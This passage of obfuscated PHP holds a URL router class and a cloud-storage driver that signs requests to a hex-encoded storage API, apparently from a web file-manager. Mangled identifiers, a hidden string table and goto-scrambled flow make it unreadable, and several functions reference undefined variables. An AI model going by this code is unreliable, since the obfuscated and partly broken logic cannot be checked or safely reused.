(substr($eœç”“é°, -3) == $Fø­ñ‚‰¥[1357]) { echo $Fø­ñ‚‰¥[1358] . $ašøøğĞù÷ . $Fø­ñ‚‰¥[1359] . $Fø­ñ‚‰¥[213]; } else { if (substr($eœç”“é°, -4) == $Fø­ñ‚‰¥[1360]) { echo $Fø­ñ‚‰¥[1361] . $ašøøğĞù÷ . $Fø­ñ‚‰¥[1362] . $Fø­ñ‚‰¥[213]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\x6e\x79" => "\x5b\x5e\x2f\135\x2b", "\72\156\165\155" => "\133\x30\x2d\71\135\x2b", "\x3a\141\x6c\154" => "\x2e\52"); public static $errorCallback; public static function __callstatic($A¡­°¬Œ‰Ú, $F—©†šôòÓ) { $b­©ãŒ§Ğù =& $_SERVER[Ö]; if ($A¡­°¬Œ‰Ú == $b­©ãŒ§Ğù[1363]) { $bÓ£Ó‚ˆ¯  = array_map($b­©ãŒ§Ğù[1364], $F—©†šôòÓ[0]); $b¡İ†×À¢Ä = strpos($F—©†šôòÓ[1], $b­©ãŒ§Ğù[8]) === 0 ? $F—©†šôòÓ[1] : $b­©ãŒ§Ğù[8] . $F—©†šôòÓ[1]; $cåªÙâÚÜÎ = $F—©†šôòÓ[2]; } else { $bÓ£Ó‚ˆ¯  = null; $b¡İ†×À¢Ä = strpos($F—©†šôòÓ[0], $b­©ãŒ§Ğù[8]) === 0 ? $F—©†šôòÓ[0] : $b­©ãŒ§Ğù[8] . $F—©†šôòÓ[0]; $cåªÙâÚÜÎ = $F—©†šôòÓ[1]; } array_push(self::$maps, $bÓ£Ó‚ˆ¯ ); array_push(self::$routes, $b¡İ†×À¢Ä); array_push(self::$methods, strtoupper($A¡­°¬Œ‰Ú)); array_push(self::$callbacks, $cåªÙâÚÜÎ); } public static function error($eâÆøÓ) { self::$errorCallback = $eâÆøÓ; } public static function haltOnMatch($F†µˆ¡Ù‡İ = true) { self::$halts = $F†µˆ¡Ù‡İ; } public static function dispatch() { goto dÔÁ­î½Ü; dÔÁ­î½Ü: $BĞâÚÄˆíø =& $_SERVER[Ö]; $cÅØ¢°Ç¤¡ = parse_url($_SERVER[$BĞâÚÄˆíø[1365]], PHP_URL_PATH); $FÔ¹ßŠâ´½ = $_SERVER[$BĞâÚÄˆíø[150]]; goto Bòñô½¨“Ë; A­ôğĞ™á: self::$routes = preg_replace($BĞâÚÄˆíø[1066], $BĞâÚÄˆíø[8], self::$routes); if (in_array($cÅØ¢°Ç¤¡, self::$routes)) { $Dô¸Â§©« = array_keys(self::$routes, $cÅØ¢°Ç¤¡); foreach ($Dô¸Â§©« as $cç¬¹îïë–) { if (self::$methods[$cç¬¹îïë–] == $FÔ¹ßŠâ´½ || self::$methods[$cç¬¹îïë–] == $BĞâÚÄˆíø[1366] || in_array($FÔ¹ßŠâ´½, self::$maps[$cç¬¹îïë–])) { $aÔÊÆÙÓÁñ = !0; if (!is_object(self::$callbacks[$cç¬¹îïë–])) { $D‡‚…‰¤” = explode($BĞâÚÄˆíø[8], self::$callbacks[$cç¬¹îïë–]); $C‘õ™¼¡ºé = end($D‡‚…‰¤”); $bĞ¡µİÃƒ… = explode($BĞâÚÄˆíø[1367], $C‘õ™¼¡ºé); $c½»³¦ä‚Ğ = new $bĞ¡µİÃƒ…[0](); $c½»³¦ä‚Ğ->{$bĞ¡µİÃƒ…[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$cç¬¹îïë–]); if (self::$halts) { return; } } } } } else { $BÉÕ¹…êã  = 0; foreach (self::$routes as $cç¬¹îïë–) { if (strpos($cç¬¹îïë–, $BĞâÚÄˆíø[4]) !== !1) { $cç¬¹îïë– = str_replace($fæ½ïÇÀ½, $d‘Ó•Ú±ƒŒ, $cç¬¹îïë–); } if (preg_match($BĞâÚÄˆíø[1368] . $cç¬¹îïë– . $BĞâÚÄˆíø[1369], $cÅØ¢°Ç¤¡, $eÓ£™äß)) { if (self::$methods[$BÉÕ¹…êã ] == $FÔ¹ßŠâ´½ || self::$methods[$BÉÕ¹…êã ] == $BĞâÚÄˆíø[1366] || !empty(self::$maps[$BÉÕ¹…êã ]) && in_array($FÔ¹ßŠâ´½, self::$maps[$BÉÕ¹…êã ])) { $aÔÊÆÙÓÁñ = !0; array_shift($eÓ£™äß); if (!is_object(self::$callbacks[$BÉÕ¹…êã ])) { $D‡‚…‰¤” = explode($BĞâÚÄˆíø[8], self::$callbacks[$BÉÕ¹…êã ]); $C‘õ™¼¡ºé = end($D‡‚…‰¤”); $bĞ¡µİÃƒ… = explode($BĞâÚÄˆíø[1367], $C‘õ™¼¡ºé); $c½»³¦ä‚Ğ = new $bĞ¡µİÃƒ…[0](); if (!method_exists($c½»³¦ä‚Ğ, $bĞ¡µİÃƒ…[1])) { echo $BĞâÚÄˆíø[1370]; } else { call_user_func_array(array($c½»³¦ä‚Ğ, $bĞ¡µİÃƒ…[1]), $eÓ£™äß); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$BÉÕ¹…êã ], $eÓ£™äß); if (self::$halts) { return; } } } } $BÉÕ¹…êã ++; } } if ($aÔÊÆÙÓÁñ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $e™«´Ò ‘ê =& $_SERVER[Ö]; header($_SERVER[$e™«´Ò ‘ê[1371]] . $e™«´Ò ‘ê[1372]); echo $e™«´Ò ‘ê[1373]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$BĞâÚÄˆíø[1365]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto BÏÀÕ·ëŒ; Bòñô½¨“Ë: $fæ½ïÇÀ½ = array_keys(static::$patterns); $d‘Ó•Ú±ƒŒ = array_values(static::$patterns); $aÔÊÆÙÓÁñ = !1; goto A­ôğĞ™á; BÏÀÕ·ëŒ: } } goto D„´´‹ºİƒ; Aõ„âÖ­×Á: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\164\160\x3a\57\x2f\x76\60\56\141\x70\x69\x2e\165\x70\x79\x75\156\56\x63\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($d‡Åó‚‰ÉÁ) { parent::__construct(); $this->_init($d‡Åó‚‰ÉÁ); } public function _init($CÀÓ¾İ‡Š) { foreach ($CÀÓ¾İ‡Š as $DÌêœÁ‹À => $Dæ±ó«Ÿ ˆ) { if (isset($this->{$DÌêœÁ‹À})) { $this->{$DÌêœÁ‹À} = $Dæ±ó«Ÿ ˆ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { show_json($_SERVER[Ö][1226], !1); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($BÙÚ„Óàêç, $eÒ‹ÙÁçÏ = "\107\x45\x54") { $D¦áÓñÏäœ =& $_SERVER[Ö]; $DÛ÷„Îƒ°Õ = gmdate($D¦áÓñÏäœ[1190]); $E£ÊÀ¸™¬É = base64_encode(hash_hmac($D¦áÓñÏäœ[1227], "{$eÒ‹ÙÁçÏ}\x26{$BÙÚ„Óàêç}\46{$DÛ÷„Îƒ°Õ}", md5("{$this->userpass}"), !0)); $A¦Şö‡É§ª = array("\101\x75\164\150\x6f\x72\151\x7a\x61\164\151\157\x6e\72\125\x50\x59\x55\x4e\x20{$this->username}\x3a{$E£ÊÀ¸™¬É}", "\104\x61\164\x65\x3a{$DÛ÷„Îƒ°Õ}"); return $A¦Şö‡É§ª; } public function ussRequest($bâ®£ËÈÆé, $f‘—…´¼ßœ = "\107\x45\x54", $E¬§õ†ª£¹ = false, $d„„÷Ş›ŒÁ = false, $c‰ ë¸¬ƒ = false) { goto E„ÈâÌÒèò; cñÖ¦Ò¸ª: if (!$Dƒ˜ÉƒäØˆ) { return array($aÌª©Ä±¤Ñ[1025] => !1, $aÌª©Ä±¤Ñ[1027] => $aÌª©Ä±¤Ñ[1228]); } if (strtolower($f‘—…´¼ßœ) == $aÌª©Ä±¤Ñ[180] || in_array($Dƒ˜ÉƒäØˆ[$aÌª©Ä±¤Ñ[1025]], array($aÌª©Ä±¤Ñ[1086], $aÌª©Ä±¤Ñ[1229]))) { $E¬§õ†ª£¹ = $Dƒ˜ÉƒäØˆ[$aÌª©Ä±¤Ñ[1230]]; } else { $E¬§õ†ª£¹ = json_decode($Dƒ˜ÉƒäØˆ[$aÌª©Ä±¤Ñ[1027]], !0); if (!$E¬§õ†ª£¹) { $E¬§õ†ª£¹ = $Dƒ˜ÉƒäØˆ[$aÌª©Ä±¤Ñ[1027]]; } else { if (!$Dƒ˜ÉƒäØˆ[$aÌª©Ä±¤Ñ[682]] && isset($E¬§õ†ª£¹[$aÌª©Ä±¤Ñ[1231]])) { $E¬§õ†ª£¹ = $E¬§õ†ª£¹[$aÌª©Ä±¤Ñ[1231]]; } } } return array($aÌª©Ä±¤Ñ[1025] => $Dƒ˜ÉƒäØˆ[$aÌª©Ä±¤Ñ[682]], $aÌª©Ä±¤Ñ[1027] => $E¬§õ†ª£¹); goto Fãİ™¬“ì©; EœÅÁ»«–§: $C¯×ÉíéÀñ = $this->ussHeaders($b³ë† ¼¸ï, $f‘—…´¼ßœ); if ($d„„÷Ş›ŒÁ) { $C¯×ÉíéÀñ = array_merge($C¯×ÉíéÀñ, $d„„÷Ş›ŒÁ); } $Dƒ˜ÉƒäØˆ = url_request($this->endpoint . $b³ë† ¼¸ï, $f‘—…´¼ßœ, $E¬§õ†ª£¹, $C¯×ÉíéÀñ, $c‰ ë¸¬ƒ); goto cñÖ¦Ò¸ª; E„ÈâÌÒèò: $aÌª©Ä±¤Ñ =& $_SERVER[Ö]; $bâ®£ËÈÆé = trim($bâ®£ËÈÆé, $aÌª©Ä±¤Ñ[8]); $b³ë† ¼¸ï = "\x2f{$this->bucket}\x2f{$bâ®£ËÈÆé}"; goto EœÅÁ»«–§; Fãİ™¬“ì©: } public function mkfile($aÛÚöâ¾ºÇ, $fÊ›·ß½ˆø = '', $AâÍÃ¢â´® = REPEAT_RENAME) { if ($this->setContent($aÛÚöâ¾ºÇ, $fÊ›·ß½ˆø)) { return $this->getPathOuter($aÛÚöâ¾ºÇ); } return !1; } public function mkdir($cì²ÜÉÎÍõ, $b–ßêÙ¤ = REPEAT_SKIP) { $Eôæ’É³ó =& $_SERVER[Ö]; $fŸĞ¾ëù¢© = trim($cì²ÜÉÎÍõ, $Eôæ’É³ó[8]); if ($this->_isFolder($fŸĞ¾ëù¢©)) { return $this->getPathOuter($fŸĞ¾ëù¢©); } $fÅŸØ÷Ïéß = array($Eôæ’É³ó[1232]); $dÔÑêÛµ• = $this->ussRequest($fŸĞ¾ëù¢©, $Eôæ’É³ó[208], !1, $fÅŸØ÷Ïéß); return $dÔÑêÛµ•[$Eôæ’É³ó[1025]] ? $this->getPathOuter($fŸĞ¾ëù¢©) : !1; } public function copyFile($A·âĞ¤Œ­, $D¸áÀË¦ä) { $Aò—íõŞä =& $_SERVER[Ö]; $A‡ë”‹Â³‰ = array($Aò—íõŞä[1233] . "\57{$this->bucket}\x2f{$A·âĞ¤Œ­}", $Aò—íõŞä[1234]); $a¯ÈÇ¤íëª = $this->ussRequest($D¸áÀË¦ä, $Aò—íõŞä[210], !1, $A‡ë”‹Â³‰); return $a¯ÈÇ¤íëª[$Aò—íõŞä[1025]] ? !0 : !1; } public function moveFile($Bˆ®Œ¿Õî, $E–ãß¶ã¦Ñ) { $FÑŸÖİ÷ğ =& $_SERVER[Ö]; $eã—´†¤…ï = array($FÑŸÖİ÷ğ[1235] . "\57{$this->bucket}\57{$Bˆ®Œ¿Õî}", $FÑŸÖİ÷ğ[1234]); $a¤ÙÀˆ×°¡ = $this->ussRequest($E–ãß¶ã¦Ñ, $FÑŸÖİ÷ğ[210], !1, $eã—´†¤…ï); return $a¤ÙÀˆ×°¡[$FÑŸÖİ÷ğ[1025]] ? !0 : !1; } public function delFile($f¸ÊÇ¥¥¸è) { $cğíÅ¢ì¨ =& $_SERVER[Ö]; $F—ôíçğ¬Ø = $this->ussRequest($f¸ÊÇ¥¥¸è, $cğíÅ¢ì¨[1236]); return $F—ôíçğ¬Ø[$cğíÅ¢ì¨[1025]] ? !0 : !1; } public function delFolder($Aš¡¨È°‘) { $c›¢’Ù­« =& $_SERVER[Ö]; $cÁÊí©¤©Ğ = $this->listAll($Aš¡¨È°‘); krsort($cÁÊí©¤©Ğ); foreach ($cÁÊí©¤©Ğ as $Fñë¾¹í†) { $this->ussRequest($Fñë¾¹í†[$c›¢’Ù­«[75]], $c›¢’Ù­«[1236]); } return $this->ussRequest($Aš¡¨È°‘, $c›¢’Ù­«[1236]); } public function rename($DßµÌˆÌ, $C‰±†›´¸) { if ($this->isFile($DßµÌˆÌ)) { $C‰±†›´¸ = get_path_father($DßµÌˆÌ) . $C‰±†›´¸; return $this->moveFile($DßµÌˆÌ, $C‰±†›´¸); } return $this->renameObject($DßµÌˆÌ, $C‰±†›´¸); } public function fileInfo($CŒ·¬àëÆ, $Cˆ±×»˜“  = false, $b†Óá³‡…„ = array()) { $FÂÙˆ‚°‹á =& $_SERVER[Ö]; if ($Cˆ±×»˜“ ) { return array($FÂÙˆ‚°‹á[28] => $this->pathThis($CŒ·¬àëÆ), $FÂÙˆ‚°‹á[75] => $this->getPathOuter($FÂÙˆ‚°‹á[8] . $CŒ·¬àëÆ), $FÂÙˆ‚°‹á[29] => $FÂÙˆ‚°‹á[163], $FÂÙˆ‚°‹á[77] => isset($b†Óá³‡…„[$FÂÙˆ‚°‹á[321]]) ? $b†Óá³‡…„[$FÂÙˆ‚°‹á[321]] : 0, $FÂÙˆ‚°‹á[156] => $this->ext($CŒ·¬àëÆ)); } $C…¯†¯µÌÆ = array($FÂÙˆ‚°‹á[28] => $this->pathThis($CŒ·¬àëÆ), $FÂÙˆ‚°‹á[75] => $this->getPathOuter($FÂÙˆ‚°‹á[8] . $CŒ·¬àëÆ), $FÂÙˆ‚°‹á[29] => $FÂÙˆ‚°‹á[163], $FÂÙˆ‚°‹á[183] => 0, $FÂÙˆ‚°‹á[106] => isset($CôÜĞŠ§Ò»[$FÂÙˆ‚°‹á[1237]]) ? $CôÜĞŠ§Ò»[$FÂÙˆ‚°‹á[1237]] : 0, $FÂÙˆ‚°‹á[77] => isset($b†Óá³‡…„[$FÂÙˆ‚°‹á[321]]) ? $b†Óá³‡…„[$FÂÙˆ‚°‹á[321]] : 0, $FÂÙˆ‚°‹á[156] => $this->ext($CŒ·¬àëÆ), $FÂÙˆ‚°‹á[184] => !0, $FÂÙˆ‚°‹á[185] => !0); if (empty($b†Óá³‡…„)) { $b†Óá³‡…„ = $this->objectMeta($CŒ·¬àëÆ); if (!$b†Óá³‡…„) { return $C…¯†¯µÌÆ; } $C…¯†¯µÌÆ[$FÂÙˆ‚°‹á[183]] = $b†Óá³‡…„[$FÂÙˆ‚°‹á[1238]]; $C…¯†¯µÌÆ[$FÂÙˆ‚°‹á[106]] = $b†Óá³‡…„[$FÂÙˆ‚°‹á[1239]]; $C…¯†¯µÌÆ[$FÂÙˆ‚°‹á[77]] = $b†Óá³‡…„[$FÂÙˆ‚°‹á[77]]; } return $C…¯†¯µÌÆ; } public function folderInfo($eîÒš“œšİ, $dñ¶øÒµ = false) { $Cò‹‹†©Ñ =& $_SERVER[Ö]; if ($dñ¶øÒµ) { return array($Cò‹‹†©Ñ[28] => $this->pathThis($eîÒš“œšİ), $Cò‹‹†©Ñ[75] => $this->getPathOuter($Cò‹‹†©Ñ[8] . $eîÒš“œšİ), $Cò‹‹†©Ñ[29] => $Cò‹‹†©Ñ[76]); } $FÎİ™§å½ = array($Cò‹‹†©Ñ[28] => $this->pathThis($eîÒš“œšİ), $Cò‹‹†©Ñ[75] => $this->getPathOuter($Cò‹‹†©Ñ[8] . $eîÒš“œšİ), $Cò‹‹†©Ñ[29] => $Cò‹‹†©Ñ[76], $Cò‹‹†©Ñ[183] => 0, $Cò‹‹†©Ñ[106] => isset($dî›¾¢¾«„[$Cò‹‹†©Ñ[1237]]) ? $dî›¾¢¾«„[$Cò‹‹†©Ñ[1237]] : 0, $Cò‹‹†©Ñ[1147] => !0, $Cò‹‹†©Ñ[1148] => !0); if (empty($e›ÎÕËÎïŒ)) { $e›ÎÕËÎïŒ = $this->objectMeta($eîÒš“œšİ); if (!$e›ÎÕËÎïŒ) { return $FÎİ™§å½; } $FÎİ™§å½[$Cò‹‹†©Ñ[183]] = $e›ÎÕËÎïŒ[$Cò‹‹†©Ñ[1238]]; $FÎİ™§å½[$Cò‹‹†©Ñ[106]] = $e›ÎÕËÎïŒ[$Cò‹‹†©Ñ[1239]]; } return $FÎİ™§å½; } private function fileList($FœŞ¤ÑĞÙÇ, $EÄ‰‡Í¼… = 0, $c÷Ò­‡„Á = 1000) { $bñ…ÉØ®í =& $_SERVER[Ö]; $eÆ»´ù‹—¿ = array($bñ…ÉØ®í[1240], $bñ…ÉØ®í[1241] . $c÷Ò­‡„Á); if ($EÄ‰‡Í¼…) { $eÆ»´ù‹—¿[] = $bñ…ÉØ®í[1242] . $EÄ‰‡Í¼…; } $DÃÕŠéß÷Ë = $this->ussRequest($FœŞ¤ÑĞÙÇ, $bñ…ÉØ®í[212], !1, $eÆ»´ù‹—¿); return !$DÃÕŠéß÷Ë[$bñ…ÉØ®í[1025]] ? !1 : $DÃÕŠéß÷Ë[$bñ…ÉØ®í[1027]]; } public function listPath($BĞ¹Ó¨öˆî, $fëíò©¸à» = false) { goto Dá´¿ÁîÇ˜; Dá´¿ÁîÇ˜: $cùã»ºĞñ£ =& $_SERVER[Ö]; $fëê¶Û±è‘ = $cùã»ºĞñ£[33]; $eâ²é–é = 1000; goto fä…¢í‘Á; AöŒ‡ŸŸÒì: return array($cùã»ºĞñ£[74] => $D¹ŒñôÊ¿´, $cùã»ºĞñ£[73] => $F¼œèâİ¿); goto dˆ¹Š­…´ä; fä…¢í‘Á: $D¹ŒñôÊ¿´ = $F¼œèâİ¿ = array(); $F’öĞ˜‡¬± = rtrim($BĞ¹Ó¨öˆî, $cùã»ºĞñ£[8]) . $cùã»ºĞñ£[8]; while (!0) { $c¡‡’»·øä = $this->fileList($BĞ¹Ó¨öˆî, $fëê¶Û±è‘, $eâ²é–é); if (!$c¡‡’»·øä) { return !1; } $fëê¶Û±è‘ = isset($c¡‡’»·øä[$cùã»ºĞñ£[1243]]) ? $c¡‡’»·øä[$cùã»ºĞñ£[1243]] : $cùã»ºĞñ£[33]; $DÃ§ƒîæ = isset($c¡‡’»·øä[$cùã»ºĞñ£[1244]]) ? $c¡‡’»·øä[$cùã»ºĞñ£[1244]] : array(); foreach ($DÃ§ƒîæ as $c¯Â§ÌÕ¤¨) { if ($c¯Â§ÌÕ¤¨[$cùã»ºĞñ£[29]] == $cùã»ºĞñ£[76]) { $D¹ŒñôÊ¿´[] = $this->folderInfo($F’öĞ˜‡¬± . $c¯Â§ÌÕ¤¨[$cùã»ºĞñ£[28]], $fëíò©¸à», $c¯Â§ÌÕ¤¨); } else { $F¼œèâİ¿[] = $this->fileInfo($F’öĞ˜‡¬± . $c¯Â§ÌÕ¤¨[$cùã»ºĞñ£[28]], $fëíò©¸à», $c¯Â§ÌÕ¤¨); } } if (count($DÃ§ƒîæ) < $eâ²é–é) { break; } } goto AöŒ‡ŸŸÒì; dˆ¹Š­…´ä: } private function recursionAllFiles($f“Äö‚æ†, &$EÍ„¡ñŒ®) { $fğÓóÒŠ³‹ =& $_SERVER[Ö]; $eÄ‡¸ƒ « = $fğÓóÒŠ³‹[33]; $aÔæìàöÜŠ = 1000; $bÆ¨ïĞª“ä = $DÍ¢…ƒ‘œ¹ = array(); $bÈºõ¢–ä¦ = rtrim($f“Äö‚æ†, $fğÓóÒŠ³‹[8]) . $fğÓóÒŠ³‹[8]; while (!0) { $fÔ»±ó·í = $this->fileList($f“Äö‚æ†, $eÄ‡¸ƒ «, $aÔæìàöÜŠ); if (!$fÔ»±ó·í) { return !1; } $eÄ‡¸ƒ « = isset($fÔ»±ó·í[$fğÓóÒŠ³‹[1243]]) ? $fÔ»±ó·í[$fğÓóÒŠ³‹[1243]] : $fğÓóÒŠ³‹[33]; $d¥²èçĞ± = isset($fÔ»±ó·í[$fğÓóÒŠ³‹[1244]]) ? $fÔ»±ó·í[$fğÓóÒŠ³‹[1244]] : array(); foreach ($d¥²èçĞ± as $bğìà”Ëóâ) { $Fßäèİ˜»Ÿ = array($fğÓóÒŠ³‹[75] => $bÈºõ¢–ä¦ . $bğìà”Ëóâ[$fğÓóÒŠ³‹[28]], $fğÓóÒŠ³‹[76] => $bğìà”Ëóâ[$fğÓóÒŠ³‹[29]] == $fğÓóÒŠ³‹[76] ? 1 : 0, $fğÓóÒŠ³‹[77] => isset($bğìà”Ëóâ[$fğÓóÒŠ³‹[321]]) ? $bğìà”Ëóâ[$fğÓóÒŠ³‹[321]] : 0); $EÍ„¡ñŒ®[] = $Fßäèİ˜»Ÿ; if ($Fßäèİ˜»Ÿ[$fğÓóÒŠ³‹[76]] == 1) { $this->recursionAllFiles($Fßäèİ˜»Ÿ[$fğÓóÒŠ³‹[75]], $EÍ„¡ñŒ®); } } if (count($d¥²èçĞ±) < $aÔæìàöÜŠ) { break; } } } public function has($c’öŠåÃ×, $fçß×ŠÖº = false, $fŒÚ‡èÙ¡ê = true) { goto aè‹ˆ¬ÎÑ†; aè‹ˆ¬ÎÑ†: $aº¡¹ Ş´… =& $_SERVER[Ö]; $bÒŸ“ßè´¹ = $aº¡¹ Ş´…[33]; $c—‰‘¯ÇŞ = 1000; goto A´éŒÔëÑñ; A´éŒÔëÑñ: $Eæ¨Â˜ìÂ× = 0; $C¬¥›å‰Ú° = 0; $fğìî”¤° = rtrim($c’öŠåÃ×, $aº¡¹ Ş´…[8]) . $aº¡¹ Ş´…[8]; goto E…ç÷Ã„Ûö; E…ç÷Ã„Ûö: while (!0) { $E•º†—Ê”ƒ = $this->fileList($c’öŠåÃ×, $bÒŸ“ßè´¹, $c—‰‘¯ÇŞ); if (!$E•º†—Ê”ƒ) { return !1; } $bÒŸ“ßè´¹ = isset($E•º†—Ê”ƒ[$aº¡¹ Ş´…[1243]]) ? $E•º†—Ê”ƒ[$aº¡¹ Ş´…[1243]] : $aº¡¹ Ş´…[33]; $A…óĞå—áÈ = isset($E•º†—Ê”ƒ[$aº¡¹ Ş´…[1244]]) ? $E•º†—Ê”ƒ[$aº¡¹ Ş´…[1244]] : array(); if (empty($A…óĞå—áÈ)) { break; } $bÒ·Î™Ï¹‘ = array_to_keyvalue($A…óĞå—áÈ, $aº¡¹ Ş´…[33], $aº¡¹ Ş´…[29]); $FİŒñ‘Î = array_count_values($bÒ·Î™Ï¹‘); $c¢¿Ä™ß¿¸ = isset($FİŒñ‘Î[$aº¡¹ Ş´…[76]]) ? $FİŒñ‘Î[$aº¡¹ Ş´…[76]] : 0; $c ÆŒ×‡˜ = count($bÒ·Î™Ï¹‘) - $c¢¿Ä™ß¿¸; if ($fçß×ŠÖº) { $C¬¥›å‰Ú° += $c¢¿Ä™ß¿¸; $Eæ¨Â˜ìÂ× += $c ÆŒ×‡˜; if ($FçÁÓ„àôê < $c—‰‘¯ÇŞ) { break; } continue; } if ($fŒÚ‡èÙ¡ê) { if ($c ÆŒ×‡˜) { return !0; } } else { if ($c¢¿Ä™ß¿¸) { return !0; } } if (count($A…óĞå—áÈ) < $c—‰‘¯ÇŞ) { break; } } if ($fçß×ŠÖº) { return array($aº¡¹ Ş´…[187] => $Eæ¨Â˜ìÂ×, $aº¡¹ Ş´…[188] => $C¬¥›å‰Ú°); } return !1; goto E”ÑŞ†­¾½; E”ÑŞ†­¾½: } public function listAll($F¨ì£Ÿ«Š°) { $CÆ½éæç½î = array(); $this->recursionAllFiles($F¨ì£Ÿ«Š°, $CÆ½éæç½î); return $CÆ½éæç½î; } public function canRead($cçÌÀ¹âŠ×) { return $this->exist($cçÌÀ¹âŠ×) ? !0 : !1; } public function canWrite($bÛ®¡ŞÎê×) { return $this->exist($bÛ®¡ŞÎê×) ? !0 : !1; } public function getContent($b—ÆË®àøÒ) { return $this->fileSubstr($b—ÆË®àøÒ, 0, -1); } public function setContent($b…İìÈË‚ò, $bÅ‡¸ß”¦ = '') { $dÎ›çò©Ò =& $_SERVER[Ö]; if (!$bÅ‡¸ß”¦) { $aÄµñÎµšÎ = $this->ussRequest($b…İìÈË‚ò, $dÎ›çò©Ò[208]); return $aÄµñÎµšÎ[$dÎ›çò©Ò[1025]]; } $Cä½æÄ“ÁÊ = $this->tempFile($this->pathThis($b…İìÈË‚ò)); file_put_contents($Cä½æÄ“ÁÊ, $bÅ‡¸ß”¦); if ($this->upload($b…İìÈË‚ò, $Cä½æÄ“ÁÊ)) { $this->tempFileRemve($Cä½æÄ“ÁÊ); return !0; } return !1; } public function fileSubstr($f»Ê•×¨©¬, $E¶Šº£™¨, $FÖãê“™ãª) { $A–Å‘¤ÌÆÛ =& $_SERVER[Ö]; if (!($f…¢«ßÂÜ = $this->link($f»Ê•×¨©¬))) { return !1; } $bšÙŠÃÂÈ— = !1; if ($FÖãê“™ãª > 0) { $dŒ¸çÃÉ¿ğ = $E¶Šº£™¨ + $FÖãê“™ãª - 1; $bšÙŠÃÂÈ— = array($A–Å‘¤ÌÆÛ[1205] . $E¶Šº£™¨ . $A–Å‘¤ÌÆÛ[408] . $dŒ¸çÃÉ¿ğ); } $F¯®Å§¨ÂÁ = url_request($f…¢«ßÂÜ, $A–Å‘¤ÌÆÛ[212], !1, $bšÙŠÃÂÈ—); return $F¯®Å§¨ÂÁ[$A–Å‘¤ÌÆÛ[682]] ? $F¯®Å§¨ÂÁ[$A–Å‘¤ÌÆÛ[1027]] : !1; } public function upload($FĞªØÇ‡ÅÍ, $BîÑÌÙÏ»¸, $e‰Ññ·È¾ = false, $E‹³Æ¹Á£ = REPEAT_REPLACE) { goto f¨ÚÔİ¦; eâí²Áàå¦: do { $e¿·­¶¶­Î = $c¿Æò„æ„[$F¤ ˜ğäî[1251]]; fseek($E’›²²äŞ, $E‘Ø­Ş¾—²); $aó¾´ºè  = fread($E’›²²äŞ, $e¿·­¶¶­Î); $F¡³ë³íôÊ = 0; do { $F¡³ë³íôÊ++; $c¿Æò„æ„ = $this->uploadPart($FĞªØÇ‡ÅÍ, $c¿Æò„æ„, $aó¾´ºè ); } while (!$c¿Æò„æ„ && $F¡³ë³íôÊ < 3); if (!$c¿Æò„æ„) { return !1; } $bõ‰‘Øó‘˜ = $c¿Æò„æ„[$F¤ ˜ğäî[1250]]; $E‘Ø­Ş¾—² += $e¿·­¶¶­Î; } while ($bõ‰‘Øó‘˜ != -1); fclose($E’›²²äŞ); $C´¼«»ƒ‘× = array($F¤ ˜ğäî[1252], $F¤ ˜ğäî[1253] . $c¿Æò„æ„[$F¤ ˜ğäî[1254]], $F¤ ˜ğäî[1248]); goto fÊï»ù½‘µ; c—¬ñ¨Î³Í: $bõ‰‘Øó‘˜ = $c¿Æò„æ„[$F¤ ˜ğäî[1250]]; $E’›²²äŞ = fopen($BîÑÌÙÏ»¸, $F¤ ˜ğäî[1155]); if (!$E’›²²äŞ) { return !1; } goto eâí²Áàå¦; f¨ÚÔİ¦: $F¤ ˜ğäî =& $_SERVER[Ö]; $d¢ï¤‚î¦¬ = IO::size($BîÑÌÙÏ»¸); if ($d¢ï¤‚î¦¬ <= 1024 * 1024 * 200) { $B–Ÿ½Ù¸ = array($F¤ ˜ğäî[1245] . $BîÑÌÙÏ»¸); $eé„«Æ¦©“ = $this->ussRequest($FĞªØÇ‡ÅÍ, $F¤ ˜ğäî[210], $B–Ÿ½Ù¸); return $eé„«Æ¦©“[$F¤ ˜ğäî[1025]] ? $this->getPathOuter($FĞªØÇ‡ÅÍ) : !1; } goto dæô®ï»å; fÊï»ù½‘µ: $eé„«Æ¦©“ = $this->ussRequest($FĞªØÇ‡ÅÍ, $F¤ ˜ğäî[210], !1, $C´¼«»ƒ‘×); return $eé„«Æ¦©“[$F¤ ˜ğäî[1025]] ? $this->getPathOuter($DöİŸÒ£¸î) : !1; goto BŒïÈÖĞì²; dæô®ï»å: $cØ„èŸ‰¿Ü = 1024 * 1024 * 10; $C´¼«»ƒ‘× = array($F¤ ˜ğäî[1246], $F¤ ˜ğäî[1247] . $d¢ï¤‚î¦¬, $F¤ ˜ğäî[1248], $F¤ ˜ğäî[1249] . $cØ„èŸ‰¿Ü); $eé„«Æ¦©“ = $this->ussRequest($FĞªØÇ‡ÅÍ, $F¤ ˜ğäî[210], !1, $C´¼«»ƒ‘×); goto a©µ‘ÊÖ‹; a©µ‘ÊÖ‹: if (!$eé„«Æ¦©“[$F¤ ˜ğäî[1025]]) { return !1; } $c¿Æò„æ„ = $eé„«Æ¦©“[$F¤ ˜ğäî[1027]]; $E‘Ø­Ş¾—² = 0; goto c—¬ñ¨Î³Í; BŒïÈÖĞì²: } private function uploadPart($D„ö—øˆ¦, $cÒ¤Íğö¹, &$E½êšĞ®‡) { $d£Ô¡ï“™ =& $_SERVER[Ö]; $c¬‚¦¸ğ¯Ë = array($d£Ô¡ï“™[1255], $d£Ô¡ï“™[1253] . $cÒ¤Íğö¹[$d£Ô¡ï“™[1254]], $d£Ô¡ï“™[1256] . $cÒ¤Íğö¹[$d£Ô¡ï“™[1250]], $d£Ô¡ï“™[1257] . $cÒ¤Íğö¹[$d£Ô¡ï“™[1251]]); $dïí½Ü‰Ñ† = $this->ussRequest($D„ö—øˆ¦, $d£Ô¡ï“™[210], $E½êšĞ®‡, $c¬‚¦¸ğ¯Ë); return 